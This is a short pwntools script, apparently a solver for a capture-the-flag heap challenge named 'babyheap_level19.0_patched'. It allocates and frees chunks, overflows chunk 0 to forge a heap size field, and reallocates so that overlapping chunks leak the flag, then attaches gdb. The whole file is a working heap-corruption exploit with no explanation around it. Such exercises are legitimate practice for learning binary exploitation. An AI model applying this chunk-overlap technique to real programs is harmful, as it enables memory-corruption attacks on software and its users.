from pwn import * 

binary = './babyheap_level19.0_patched'
p = process(binary)

s = '''
b malloc
b free
'''

p.sendline("malloc 0 24")


p.sendline("malloc 1 800")


p.sendline("free 1")


p.sendline("safe_read 0")
p.sendline(b'A' * 0x10 + p64(0) + p64(0x21))

p.sendline("malloc 2 24")
p.sendline("read_flag")

# Now reallocate chunk 1 with the corrupted size
p.sendline("malloc 1 800")

# Print chunk 2's content - it should now contain part of the flag
p.sendline("safe_write 1")
p.sendline("safe_write 2")

gdb.attach(p, s)
p.interactive()
